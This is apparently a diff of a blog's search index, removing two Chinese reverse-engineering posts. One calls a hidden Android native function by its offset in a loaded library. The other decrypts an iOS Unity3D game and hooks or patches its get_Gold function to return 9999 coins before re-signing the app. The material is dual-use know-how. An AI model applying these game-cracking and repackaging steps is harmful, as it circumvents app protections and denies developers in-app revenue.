-<h3 id="Android-mk"><a href="#Android-mk" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := Aes</div><div class="line">LOCAL_SRC_FILES := libAes.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := stlport_shared</div><div class="line">LOCAL_SRC_FILES := libstlport_shared.so</div><div class="line">include $(PREBUILT_SHARED_LIBRARY)</div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := my_objectname</div><div class="line">LOCAL_SRC_FILES := my_objectname.cpp</div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
-<h3 id="Application-mk"><a href="#Application-mk" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div></pre></td></tr></table></figure>
-<h3 id="my-objectname-app"><a href="#my-objectname-app" class="headerlink" title="my_objectname.app"></a>my_objectname.app</h3><p>里面写#include<jni.h>即可</jni.h></p>
-<p>最后将APP安装到手机上运行即可输出调用结果</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native3.jpg" alt=""></p>
-<h1 id="通过函数地址调用native函数"><a href="#通过函数地址调用native函数" class="headerlink" title="通过函数地址调用native函数"></a>通过函数地址调用native函数</h1><p>在逆向过程中还会遇到很多APP动态注册native函数，甚至是将导出函数隐藏的，就无法使用上述的调用方案了，本方案是通过函数地址来调用native函数，理论上只要找得到native函数在so中的地址就可以实现调用。</p>
-<h2 id="寻找native函数地址"><a href="#寻找native函数地址" class="headerlink" title="寻找native函数地址"></a>寻找native函数地址</h2><p>在java层找到native函数，确定其传入参数类型及个数</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native4.jpg" alt=""></p>
-<p>kxtmp函数是动态注册函数，现在字符串中搜索函数名，之后通过回溯找到函数注册地址</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native5.jpg" alt=""></p>
-<h2 id="编写调用so"><a href="#编写调用so" class="headerlink" title="编写调用so"></a>编写调用so</h2><p>本方案主要是通过自己编写的so调用native函数所在的so，自己的so名为hookso<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">			</div><div class="line">			System.loadLibrary(<span class="string">"hookso"</span>);</div><div class="line">			</div><div class="line">			<span class="keyword">float</span> value =TypedValue.complexToFloat(<span class="number">55297</span>);</div><div class="line">			Log.e(<span class="string">"DEBUG"</span>, <span class="string">": "</span> + value);</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</div><div class="line">			<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></div><div class="line">			getMenuInflater().inflate(R.menu.main, menu);</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</div><div class="line">			<span class="comment">// Handle action bar item clicks here. The action bar will</span></div><div class="line">			<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></div><div class="line">			<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></div><div class="line">			<span class="keyword">int</span> id = item.getItemId();</div><div class="line">			<span class="keyword">if</span> (id == R.id.action_settings) &#123;</div><div class="line">				JNI.testfunc();</div><div class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNI</span></span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">testfunc</span><span class="params">()</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="jni配置-1"><a href="#jni配置-1" class="headerlink" title="jni配置"></a>jni配置</h2><h3 id="Android-mk-1"><a href="#Android-mk-1" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"></div><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := hookso</div><div class="line">LOCAL_SRC_FILES := hookso.cpp</div><div class="line"></div><div class="line">LOCAL_LDLIBS += -llog  #<span class="built_in">log</span></div><div class="line"></div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
-<h3 id="Application-mk-1"><a href="#Application-mk-1" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div><div class="line">APP_STL := c++<span class="number">_</span>shared</div><div class="line">APP_CPPFLAGS := -fexceptions -frtti</div></pre></td></tr></table></figure>
-<h3 id="hookso-cpp"><a href="#hookso-cpp" class="headerlink" title="hookso.cpp"></a>hookso.cpp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/un.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">u_int32_t</span> <span class="params">(*<span class="keyword">common_func_t</span>)</span><span class="params">(<span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_TAG <span class="meta-string">"DEBUG"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(lvl, fmt, args...) __android_log_print(lvl, \</span></div><div class="line">		LOG_TAG, fmt, ##args)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span></span></div><div class="line">&#123;</div><div class="line">    FILE* fp;</div><div class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> *pch;</div><div class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];</div><div class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(pid &lt;= <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);</div><div class="line">    &#125;</div><div class="line">    fp = fopen(filename,<span class="string">"r"</span>);</div><div class="line">    <span class="keyword">if</span>(fp != <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>(fgets(line, <span class="keyword">sizeof</span>(line), fp))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(<span class="built_in">strstr</span>(line, module_name))</div><div class="line">            &#123;</div><div class="line">                pch = strtok(line, <span class="string">"-"</span>);</div><div class="line">                addr = strtoul(pch, <span class="literal">NULL</span>, <span class="number">16</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        fclose(fp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)addr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">string</span> str = <span class="string">"1"</span>;</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"Java_com_example_hookso_JNI_testfunc: %s\n"</span>, str.c_str());</div><div class="line">	<span class="keyword">void</span> *cs_handle = dlopen(<span class="string">"/data/local/tmp/native.so"</span>, RTLD_NOW);</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] dlerror : %s"</span>, dlerror());</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] cs_handle: %p"</span>, cs_handle);</div><div class="line"><span class="comment">//导出用下面这一句</span></div><div class="line"><span class="comment">//	void *cs_open_func = dlsym(cs_handle, "导出函数name");</span></div><div class="line"></div><div class="line">	<span class="keyword">u_int32_t</span> addr1 = (<span class="keyword">u_int32_t</span>)get_module_base(<span class="number">0</span>, <span class="string">"ntiave.so"</span>);</div><div class="line">	<span class="comment">//arm指令不加1 0，thumb指令加1 1</span></div><div class="line">	addr1 += <span class="number">0x0000ABD4</span>;</div><div class="line">	<span class="keyword">common_func_t</span> func = (<span class="keyword">common_func_t</span>)addr1;</div><div class="line"></div><div class="line">	jstring key = env-&gt;NewStringUTF(<span class="string">"1"</span>);</div><div class="line"><span class="comment">//	jstring str = env-&gt;NewStringUTF("qazwsxedcrfvtgbh64as65d465wq6d54a6s54d98aw4d65a4sd64qw6f46a4s9fd8d");</span></div><div class="line"></div><div class="line">	jstring ret1 = (jstring)func((<span class="keyword">u_int32_t</span>)env, <span class="number">0</span>, (<span class="keyword">u_int32_t</span>)key, <span class="number">0</span>);</div><div class="line"><span class="comment">//	jstring ret1 = (jstring)func((u_int32_t)env, 0, 0, 0);</span></div><div class="line"></div><div class="line">	LOGD(ANDROID_LOG_DEBUG, <span class="string">"[+] test_jstr: %s, size: %d"</span>, env-&gt;GetStringUTFChars((jstring)ret1, <span class="literal">false</span>), env-&gt;GetStringUTFLength((jstring)ret1));</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>Android</tag>
-        <tag>Tools</tag>
-        <tag>eclipse</tag>
       </tags>
   </entry>
   <entry>
@@ -387,116 +387,6 @@ gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数�
       </tags>
   </entry>
   <entry>
-    <title>Unity3D游戏修改&amp;iOS免越狱hook</title>
-    <url>/2020/06/04/iOS%E5%85%8D%E8%B6%8A%E7%8B%B1hook%E2%80%94%E2%80%94%E2%80%94%E2%80%94Unity3D%E6%B8%B8%E6%88%8F%E4%BF%AE%E6%94%B9/</url>
-    <content><![CDATA[<p>所谓免越狱Hook就是在iOS设备未进行越狱操作的前提下，对APP进行Hook操作，很久之前就有听说过，昨天花了一天时间整环境外加测试，然后又顺带修改了一个比较让人烦恼的游戏，Unity3D破解其实很早就搞过了，这次借着免越狱Hook一起分享给大家。</p>
-<a id="more"></a>
-<h1 id="工欲善其事必先利其器"><a href="#工欲善其事必先利其器" class="headerlink" title="工欲善其事必先利其器"></a>工欲善其事必先利其器</h1><ul>
-<li>越狱iPhone(必须)<br>虽然最终修改之后的APP是要装到非越狱的iPhone上，但是APP需要砸壳，外加PP助手下架之后没啥好地方下载砸壳之后的ipa了，因此必须要有一部越狱的iPhone。</li>
-<li>未越狱iPhone<br>这个不用说了，目标APP安装</li>
-<li>MonKeyDev<br>AloneMonkey大佬的作品，Hook插件编写神器，大佬还在其中集成了iOSOpenDev，同时也是非越狱插件开发集成的神器。<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85" target="_blank" rel="external">官方安装指南</a></li>
-<li>frida-ios-dump<br>AloneMonkey大佬的又一力作，砸壳神器，iOS逆向一年多了，目前为止无往不利<br>iOS frida安装 <a href="https://frida.re/docs/ios/" target="_blank" rel="external">官方安装指南</a><br>frida-ios-dump使用 <a href="https://frida.re/docs/ios/" target="_blank" rel="external">项目地址</a></li>
-<li>IDA<br>分析砸壳后的APP，导入符号表python脚本方便分析</li>
-<li>Il2CppDumper<br><a href="https://github.com/Perfare/Il2CppDumper" target="_blank" rel="external">项目地址</a><br>Unity3D游戏分析利器，Unity转换成IL2CPP的符号表提取工具，目前只支持Windows平台，最终生成的符号表脚本导入IDA用</li>
-<li>IPAPatch<br><a href="https://github.com/Naituw/IPAPatch" target="_blank" rel="external">项目地址</a><br>用于重新打包签名ipa并安装到非越狱iPhone上，非常强大。如果不想写Hook插件，也可以采取修改汇编的方式重新打包安装ipa</li>
-<li>汇编码转换器<br><a href="http://www.pc6.com/softview/SoftView_594816.html" target="_blank" rel="external">下载地址</a><br>各种类型汇编代码生成机器码的工具，方便静态修改可执行文件，重打包签名安装</li>
-</ul>
-<h1 id="抽丝剥茧"><a href="#抽丝剥茧" class="headerlink" title="抽丝剥茧"></a>抽丝剥茧</h1><p>如果上诉工具全都准备齐全，那么就就可以开始逆向工作了，作为一个侦探密，平时喜欢玩一些密室游戏，今天修改的这款游戏叫做密室逃脱绝境系列–游乐园，不得不说情节设计的很不错，在一次尝试使用提示功能时，突然发现需要金币，然而免费金币需要看广告，每次只给一枚，但是提示的话费确实逐渐增长的，感觉有被冒犯到，所以有了接下来的一切。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook3.jpg" alt=""></p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook4.jpg" alt=""></p>
-<h2 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h2><p>首先我们需要砸壳后的ipa进行分析，定位到底需要修改什么。</p>
-<p>端口转发</p>
-<pre><code>iproxy 2222 22
-</code></pre><p>首先通过frida查找要砸壳的APP进程</p>
-<pre><code>Mac-mini:frida-ios-dump-master-2 $ frida-ps -U
- PID  Name
-----  -------------------------------------------------
-2911  App Store
-2947  信息
-2980  密室逃脱绝境系列11游乐园
-2936  微信
-2972  设置
-2949  邮件
-2814  AppleIDAuthAgent
-1412  AssetCacheLocatorService
-</code></pre><p>接着运行dump.py即可脱壳</p>
-<pre><code>Mac-mini:frida-ios-dump-master-2 $ python2 dump.py 密室逃脱绝境系列11游乐园
-Start the target app 密室逃脱绝境系列11游乐园
-Dumping 密室逃脱绝境系列11游乐园 to /var/folders/m7/g2v2sbfd19g9kg7sk20n639h0000gn/T
-start dump /var/containers/Bundle/Application/617F2079-957E-4005-92B8-7573FE651A8E/app1.app/app1
-app1.fid: 100%|███████████████████████████████████████████████████████████████| 35.7M/35.7M [00:07&lt;00:00, 5.03MB/s]
-InfoPlist.strings: 213MB [00:44, 4.97MB/s]                                                                         
-0.00B [00:00, ?B/s]Generating &quot;密室逃脱绝境系列11游乐园.ipa&quot;
-</code></pre><h2 id="Unity3D符号表恢复"><a href="#Unity3D符号表恢复" class="headerlink" title="Unity3D符号表恢复"></a>Unity3D符号表恢复</h2><p>在做这一步操作之前，机智的人已经将可执行文件脱到IDA文件中开始分析了，APP脱壳后解压ipa，然后查看app1包内容，主程序可执行文件使我们首要分析目标，一般来说是整个包中最大的那个文件。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook5.jpg" alt=""></p>
-<p>在IDA分析的过程中，我们刚好通过Il2CppDumper来提取符号表，提取符号表需要两个文件，一个是上述的主程序可执行文件，另一个则是符号表文件global-metadata.dat，iOS下该文件位于xxx.app/Data/Managed/Metadata目录下</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook6.jpg" alt=""></p>
-<p>先后选择两个文件之后，程序跳出需要输入Unity version</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook7.png" alt=""></p>
-<p>我们怎么确认到底是用了什么版本的Unity呢，只要在IDA里搜索字符串X-Unity-Version即可，调用的地方会出现版本号，我们要找的版本号即2018.4.3f1</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook8.png" alt=""></p>
-<p>在输入版本号之后，选择3即可</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook9.png" alt=""></p>
-<p>同时在Il2CppDumper的目录下，会生成dump.cs和script.py两个文件</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook10.png" alt=""></p>
-<p>将script.py导入IDA，File——&gt;Script File——&gt;选择script.py<br>该脚本的主要作用是辅助IDA识别IL2CPP表函数名，在加载脚本之前IDA识别的函数形如sub_xxxxxxx</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook11.png" alt=""></p>
-<p>加载脚本之后对函数进行了标记形成格式如类名$$函数名这样的函数</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook12.png" alt=""></p>
-<h2 id="定位修改点"><a href="#定位修改点" class="headerlink" title="定位修改点"></a>定位修改点</h2><p>在将script.py导入IDA之后，我们立刻着手分析dump.cs这个文件，该文件里面解析了游戏相关的属性和函数。可以用C#工具打开，我这里直接用source打开分析。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook13.png" alt=""></p>
-<p>与其说是分析，不如说是查找更为准确一些，我们想要修改的最终目的肯定是拥有永远花不完的金币，那么我们就去针对金币去搜索定位，我搜索了Gold，定位到有一个函数为get_Gold较为可疑</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook16.png" alt=""></p>
-<p>在IDA定位到函数地址</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook15.png" alt=""></p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook14.png" alt=""></p>
-<p>之后通过lldb下断点调试，发现在打开提示的时候触发了断点，运气不错，返回上层调用查看结果为0，之后去看了个两个视频获得了两个金币之后，返回值果然变成了2，可疑确定程序就是通过这个函数来获取金币的数量。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook17.jpg" alt=""></p>
-<h1 id="直捣黄龙"><a href="#直捣黄龙" class="headerlink" title="直捣黄龙"></a>直捣黄龙</h1><p>分析定位修改点之后，就可以对游戏进行修改了，原本是想通过免越狱Hook实现对游戏的修改，但是尝试了多次一直hook不成功，多次查找发现未越狱iOS并不支持MSHookFunction方式进行hook，同时没法对形如sub_xxxxx函数进行inlinehook。<br>这里介绍两种修改方式，一种是通过iOS越狱Hook来实现对关键函数的Hook修改，主要依赖于MonkeyDev，游戏修改了之后肯定不会天天抱着一个越狱手机来玩，所以这里准备的另一种种修改方式是针对未越狱手机的，通过直接修改汇编，重打包签名ipa安装到手机上，主要依赖于IPAPatch</p>
-<h2 id="iOS越狱修改"><a href="#iOS越狱修改" class="headerlink" title="iOS越狱修改"></a>iOS越狱修改</h2><p>iOS越狱插件的编写这里采用MonKeyDev，如何使用可见<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8" target="_blank" rel="external">官方文档</a></p>
-<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
-<li>在hook不同APP时将Tweak的plist中Bundles修改应用对应的Bundleid</li>
-<li>在Build Settings——&gt;User-Defined新建项CODE_SIGNING_ALLOWED，赋值为NO，否则编译会报错</li>
-<li>File——&gt;Project Setting将Build System修改为Legacy Build System否则编译报错</li>
-<li>切记安装sshpass</li>
-</ul>
-<h3 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h3><p>MonKeyDev支持多种Hook框架，我这里使用Tweak插件。<br>具体hook代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;mach-o/dyld.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">// 用于保存原函数指针</span></div><div class="line"><span class="keyword">int</span> (*old_get_Gold)();</div><div class="line"></div><div class="line"><span class="comment">// 新函数</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">new_get_Gold</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">9999</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">%ctor&#123;</div><div class="line"><span class="comment">// 执行hook</span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> Gold = <span class="number">_</span>dyld_get_image_vmaddr_slide(<span class="number">0</span>) + <span class="number">0x1011aa060</span>;</div><div class="line">MSHookFunction((<span class="keyword">void</span> *)Gold, (<span class="keyword">void</span> *)&amp;new_get_Gold, (<span class="keyword">void</span> **)&amp;old_get_Gold);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="iOS未越狱修改"><a href="#iOS未越狱修改" class="headerlink" title="iOS未越狱修改"></a>iOS未越狱修改</h2><h3 id="修改汇编"><a href="#修改汇编" class="headerlink" title="修改汇编"></a>修改汇编</h3><p>首先查看get_Gold函数返回位置汇编，返回时传入X1进行经过函数转换为int返回，那么可以将9999传入X0，然后直接ret即可</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook21.png" alt=""></p>
-<p>通过汇编指令生成工具生成我们需要的机器码</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook22.png" alt=""></p>
-<p>ret的机器码为C0 03 5F D6 </p>
-<p>最后修改对应地址的机器码即可</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook25.png" alt=""></p>
-<h3 id="重打包签名"><a href="#重打包签名" class="headerlink" title="重打包签名"></a>重打包签名</h3><p>将修改后的app1可执行文件重新放回原处，将解压后的ipa包重新压缩，最终改名为app.ipa,将该文件放到IPAPatch的Assets目录下，替换掉原本的app.ipa文件。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook23.jpg" alt=""></p>
-<p>最终安装到未越狱手机上效果如下</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook24.jpg" alt=""></p>
-<h1 id="隔山打牛"><a href="#隔山打牛" class="headerlink" title="隔山打牛"></a>隔山打牛</h1><p>iOS免越狱hook主要是通过iosOpenDev生成dylib注入目标APP实现Hook，iosOpenDev是apple官方支持的插件生成工具，可直接由Xcode生成。可生成CaptainHookTweak、Logos Tweak两种dylib。在注入dylib之后对APP进行重打包签名。</p>
-<p>我们接下来用到的MonKeyDev是对原有iOSOpenDev的升级，更加方便于非越狱插件的编写。</p>
-<h3 id="新建项目-amp-编译"><a href="#新建项目-amp-编译" class="headerlink" title="新建项目&amp;编译"></a>新建项目&amp;编译</h3><p>MonKeyDev安装完成之后，打开Xcode新建项目，滑动到最下方可以看到MonKeyDev提供的模块，选择第一个。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook18.jpg" alt=""></p>
-<p>新建之后需要配置General——&gt;Signing，设置自己的AppleID后续用于签名。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook19.jpg" alt=""></p>
-<p>接下来将砸壳后的ipa或ipa解压后的xxx.app放入Your_P<br>roject/TargetApp目录下，编译整个项目，最终安装到未越狱手机上信任之后正常运行表明签名成功。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook20.jpg" alt=""></p>
-<p>虽然最终没能成功实现免越狱hook修改游戏，但是我们还是拿它下手</p>
-<p>首先通过Class-dump将头文件dump下来，在其中寻找一个又代表性的函数进行Hook，最终决定hook UnityAppController这个类中的init函数，在他调用的时候弹出弹框。</p>
-<p>在your_projectDylib.xm中Hook代码如下:</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;sys/sysctl.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;UIKit/UIKit.h&gt;</span></span></div><div class="line"></div><div class="line">%hook UnityAppController</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Hooking an instance method with an argument.</span></div><div class="line">- (<span class="keyword">void</span>)init&#123;</div><div class="line">%orig;</div><div class="line"></div><div class="line">UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@<span class="string">"Hook成功"</span> message:nil delegate:self cancelButtonTitle:@<span class="string">"OK"</span> otherButtonTitles:nil];</div><div class="line">[alert show];</div><div class="line"><span class="comment">//[alert release];</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
-<p>运行程序将ipa装到未越狱手机上，游戏打开之后会有弹框出现</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Hook26.jpg" alt=""></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本来准备写一篇免越狱Hook结合Unity3D游戏修改为一体的文章，但是但是在Hook c函数的过程中遇到了难题，目前还没有找到未越狱手机上inlinhook的好方案，只能将两者分开来写，之后找到好的方案之后再进行修改为大家分享。</p>
-<p>下面附上本人iOS Unity3D入门看的一篇文章，本文大致参考了这位大佬的框架。<a href="https://www.ichenxiaoyu.com/archero/#%E5%B7%A5%E5%85%B7" target="_blank" rel="external">iOS上的Unity逆向与弓箭传说游戏修改</a></p>
-]]></content>
-      <tags>
-        <tag>iOS</tag>
-        <tag>Hook</tag>
-        <tag>Unity3D</tag>
-      </tags>
-  </entry>
-  <entry>
